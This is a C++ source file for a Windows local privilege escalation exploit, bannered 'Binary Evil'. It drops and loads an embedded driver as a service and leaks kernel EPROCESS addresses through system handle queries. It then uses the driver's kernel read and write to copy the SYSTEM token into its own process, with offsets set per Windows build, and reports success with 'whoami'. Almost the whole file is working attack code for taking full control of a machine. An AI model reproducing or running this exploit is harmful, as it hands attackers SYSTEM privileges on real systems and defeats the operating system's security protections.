#include "CorMem.h"
#include <winternl.h>
#include <stdint.h>
#include <iostream>
#include "FileUtils.hpp"
#include "Resource.hpp"
#include "Log.hpp"
#include "DriverService.hpp"

#define NtCurrentProcess()				((HANDLE)(LONG_PTR)-1)
#define SystemHandleInformation			0x10
#define SystemHandleInformationSize		0x400000
#ifndef STATUS_BUFFER_TOO_SMALL
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif // !STATUS_INFO_LENGTH_MISMATCH

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT	UniqueProcessId;
	USHORT	CreatorBackTraceIndex;
	UCHAR	ObjectTypeIndex;
	UCHAR	HandleAttributes;
	USHORT	HandleValue;
	PVOID	Object;
	ULONG	GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;


typedef
NTSTATUS(__stdcall* pfnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS,
	PVOID,
	ULONG,
	PULONG);
pfnNtQuerySystemInformation pNtQuerySystemInformation;

typedef NTSTATUS(WINAPI* pRtlGetVersion)(PRTL_OSVERSIONINFOW);


//0x1 bytes (sizeof)
typedef struct _PS_PROTECTION
{
	union
	{
		UCHAR Level;                                                        //0x0
		struct
		{
			UCHAR Type : 3;                                                   //0x0
			UCHAR Audit : 1;                                                  //0x0
			UCHAR Signer : 4;                                                 //0x0
		};
	};
}PS_PROTECTION, * PPS_PROTECTION;

typedef enum _PS_PROTECTED_SIGNER
{
	PsProtectedSignerNone = 0,
	PsProtectedSignerAuthenticode = 1,
	PsProtectedSignerCodeGen = 2,
	PsProtectedSignerAntimalware = 3,
	PsProtectedSignerLsa = 4,
	PsProtectedSignerWindows = 5,
	PsProtectedSignerWinTcb = 6,
	PsProtectedSignerWinSystem = 7,
	PsProtectedSignerApp = 8,
	PsProtectedSignerMax
} PS_PROTECTED_SIGNER;

typedef enum _PS_PROTECTED_TYPE
{
	PsProtectedTypeNone = 0,
	PsProtectedTypeProtectedLight = 1,
	PsProtectedTypeProtected = 2,
	PsProtectedTypeMax = 3
} PS_PROTECTED_TYPE;


static
int
InitFunc()
{
	HMODULE hModule = GetModuleHandle(L"ntdll.dll");

	if (hModule)
	{
		pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
		if (!pNtQuerySystemInformation)
		{
			printf("[-] NtQuerySystemInformation not loaded\n");
			return 1;
		}
	}

	return 0;
}

static
int
GetObjectPtr(
	PULONG64 ppObjAddr,
	ULONG ulPid,
	HANDLE handle)
{
	int Ret{ -1 };
	PSYSTEM_HANDLE_INFORMATION pHandleInfo{};
	ULONG		ulBytes{};
	NTSTATUS	Status{ STATUS_SUCCESS };

	while ((Status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
											   pHandleInfo,
											   ulBytes,
											   &ulBytes)) == 0xC0000004L)
	{
		if (pHandleInfo != NULL)
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(),
																  HEAP_ZERO_MEMORY,
																  pHandleInfo,
																  (size_t)2 * ulBytes);
		}
		else
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(),
																HEAP_ZERO_MEMORY,
																(size_t)2 * ulBytes);
		}
	}

	if (Status != NULL)
	{
		Ret = Status;
		goto done;
	}

	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
	{
		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) &&
			(pHandleInfo->Handles[i].HandleValue == static_cast<USHORT>(HandleToULong(handle))))
		{
			*ppObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
			Ret = 0;
			break;
		}
	}

done:

	if (pHandleInfo)
	{
		HeapFree(GetProcessHeap(), 0, pHandleInfo);
	}


	return Ret;
}

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ACCESS_MASK GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	_Field_size_(NumberOfHandles) SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;


uintptr_t GetEProcessByPid(ULONG targetPid)
{
	ULONG size = 0x100000;
	auto buffer = std::make_unique<BYTE[]>(size);

	NTSTATUS status = NtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)0x40,   // SystemExtendedHandleInformation = 64
		buffer.get(), size, &size);

	if (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		buffer = std::make_unique<BYTE[]>(size);
		status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x40, buffer.get(), size, nullptr);
	}

	if (!NT_SUCCESS(status))
	{
		std::cout << "[-] NtQuerySystemInformation failed: 0x" << std::hex << status << std::dec << "\n";
		return 0;
	}

	auto* handleInfo = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buffer.get());

	for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; ++i)
	{
		auto& entry = handleInfo->Handles[i];

		if (entry.ObjectTypeIndex == 7 || entry.ObjectTypeIndex == 8)
		{
			if (entry.UniqueProcessId == (ULongToHandle)(4))
			{
				if (4 == targetPid)
				{
					std::cout << "System Process Handle " << i << ": PID=" << entry.UniqueProcessId
						<< " HandleValue=" << std::hex << entry.HandleValue
						<< " Object=" << entry.Object
						<< " ObjectTypeIndex=" << std::dec << (int)entry.ObjectTypeIndex
						<< std::endl;
					return reinterpret_cast<uintptr_t>(entry.Object);
				}
			}

			else if (entry.UniqueProcessId == (ULongToHandle)(targetPid))
			{
				std::cout << "Handle " << i << ": PID=" << entry.UniqueProcessId
					<< " HandleValue=" << std::hex << entry.HandleValue
					<< " Object=" << entry.Object
					<< " ObjectTypeIndex=" << std::dec << (int)entry.ObjectTypeIndex
					<< std::endl;
			}

		}
	}

	//std::cout << "[-] Failed to find EPROCESS for PID " << targetPid << std::endl;
	return 0;
}


DWORD GetWindowsBuildNumber()
{
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtdll)
	{
		return 0;
	}

	pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
	if (!RtlGetVersion)
	{
		std::cout << "[-] Failed to get RtlGetVersion address. Error code: " << GetLastError() << std::endl;
		return 0;
	}

	RTL_OSVERSIONINFOW osvi = { 0 };
	osvi.dwOSVersionInfoSize = sizeof(osvi);

	if (NT_SUCCESS(RtlGetVersion(&osvi)))
	{
		std::cout << "[+] Windows Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion
			<< " Build: " << osvi.dwBuildNumber << std::endl;
		return osvi.dwBuildNumber;
	}
	return 0;
}


int main()
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, 5);  // 5 13 pink

	DWORD EPROCESS_TOKEN_OFFSET = 0;
	DWORD ProtectionOffset = 0;
	DWORD SignatureLevelOffset = 0;
	DWORD buildNumber = GetWindowsBuildNumber();

	if (buildNumber >= 26100)
	{
		EPROCESS_TOKEN_OFFSET = 0x248;
		ProtectionOffset = 0X5FA;
		SignatureLevelOffset = 0x5F8;
	}
	else if (buildNumber >= 19041)
	{
		EPROCESS_TOKEN_OFFSET = 0x4B8;
		ProtectionOffset = 0X87A;
		SignatureLevelOffset = 0x878;
	}
	else if (buildNumber >= 18362)
	{
		EPROCESS_TOKEN_OFFSET = 0x360;
		ProtectionOffset = 0X6FA;
		SignatureLevelOffset = 0x6F8;
	}
	else if (buildNumber >= 15063)
	{
		EPROCESS_TOKEN_OFFSET = 0x358;
		ProtectionOffset = 0X6CA;
		SignatureLevelOffset = 0x6C8;
	}
	else if (buildNumber >= 14393)
	{
		EPROCESS_TOKEN_OFFSET = 0x358;
		ProtectionOffset = 0X6C2;
		SignatureLevelOffset = 0x6C0;
	}
	else
	{
		return -1;
	}

	constexpr std::string_view art = R"(

$$$$$$$\   $$\                                                   $$$$$$$$\          $$\  $$\ 
$$  __$$\  \__|                                                  $$  _____|         \__| $$ |
$$ |  $$ | $$\  $$$$$$$\    $$$$$$\    $$$$$$\   $$\   $$\       $$ |   $$\    $$\  $$\  $$ |
$$$$$$$\ | $$ | $$  __$$\   \____$$\  $$  __$$\  $$ |  $$ |      $$$$$$ \$$\  $$  | $$ | $$ |
$$  __$$\  $$ | $$ |  $$ |  $$$$$$$ | $$ |  \__| $$ |  $$ |      $$  ___ \$$\$$  /  $$ | $$ |
$$ |  $$ | $$ | $$ |  $$ | $$  __$$ | $$ |       $$ |  $$ |      $$ |     \$$$  /   $$ | $$ |
$$$$$$$  | $$ | $$ |  $$ | \$$$$$$$ | $$ |       \$$$$$$$ |      $$$$$$$$$ \$  /    $$ | $$ |
\_______/  \__| \__|  \__|  \_______| \__|        \____$$ |      \_________ \_/     \__| \__|
                                                 $$\   $$ |                              
                                                 \$$$$$$  |                              
                                                  \______/                               
	)";

	LOG(art);

	SetConsoleTextAttribute(hConsole, 7);

	if (InitFunc() != 0)
	{
		LOG("[-] Failed to initialize function pointers");
		return 1;
	}

	ULONG64 SystemProcess{ 0 };
	ULONG64 CurrentProcess{ 0 };

	BOOLEAN bResult{ FALSE };
	NTSTATUS status = Utils::RtlAdjustPrivilege(20, TRUE, FALSE, &bResult);
	if (!NT_SUCCESS(status))
	{
		LOG("[-] Failed to adjust privilege. Error code: " << GetLastError());
		return 1;
	}

	auto nResult = GetObjectPtr(&SystemProcess, 4, ULongToHandle(4));
	if (nResult != 0 || SystemProcess == 0)
	{
		LOG("[-] GetObjectPtr failed for system process with error code: " << nResult);
		return nResult;
	}


	auto hCurrentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	if (!hCurrentProcess)
	{
		LOG("[-] OpenProcess failed for current process with error code: " << GetLastError());
	}
	nResult = GetObjectPtr(&CurrentProcess, GetCurrentProcessId(), hCurrentProcess);
	if (nResult != 0 || CurrentProcess == 0)
	{
		LOG("[-] GetObjectPtr failed for current process with error code: " << nResult);
		return nResult;
	}

	SetConsoleTextAttribute(hConsole, 13);
	system("whoami");
	LOG("----------------------------------Fxxking System---------------------------------");

	// Get the device name from the resource data
	std::string deviceName = FileUtils::GetServiceName(Resource::ServiceName,
													   Resource::ServiceNameSize,
													   Resource::Key);
	if (deviceName.empty())
	{
		LOG("[-] GetServiceName failed");
		return 1;
	}

	// Create the driver file from the resource data
	std::string driverFullPath;
	if (!FileUtils::CreateDriverFile(driverFullPath,
									 (const char*)Resource::hexData,
									 Resource::HexDataSize,
									 Resource::Key))
	{
		LOG("[-] CreateDriverFile failed");
		return 1;
	}

	// Register and start the driver service
	std::string strServiceName{ Resource::service };
	DriverService driverService(driverFullPath, strServiceName);
	if (!NT_SUCCESS(driverService.RegisterAndStart()))
	{
		LOG("[-] Failed to register and start driver service");
		return 1;
	}

	do 
	{
		CorMem corMem{ deviceName };

		ULONG64 systemToken = 0;
		if (!corMem.KernelRead((PVOID)(SystemProcess + EPROCESS_TOKEN_OFFSET), &systemToken, sizeof(systemToken)))
		{
			LOG("[-] KernelRead System Token address : " << std::hex << (SystemProcess + EPROCESS_TOKEN_OFFSET) << std::dec);
			break;
		}
		/*std::cout << "Read Address = " << std::hex
			<< (SystemProcess + EPROCESS_TOKEN_OFFSET) << " value : " << systemToken << std::dec << std::endl;*/

		if (!corMem.KernelWrite(reinterpret_cast<PVOID>(CurrentProcess + EPROCESS_TOKEN_OFFSET),
								&systemToken,
								sizeof(ULONG64)))
		{
			std::cout << "[-] KernelWrite Current Token failed" << std::endl;
			break;
		}

		LOG("---------------------------------------------------------------------------------");
		LOG("[+] Privilege Escalation Successful!");

		system("whoami");
		LOG("-------------------------------------End-----------------------------------------");
		SetConsoleTextAttribute(hConsole, 7);
		system("pause");
	} while (FALSE);

	driverService.StopAndUnregister();

	return 0;
}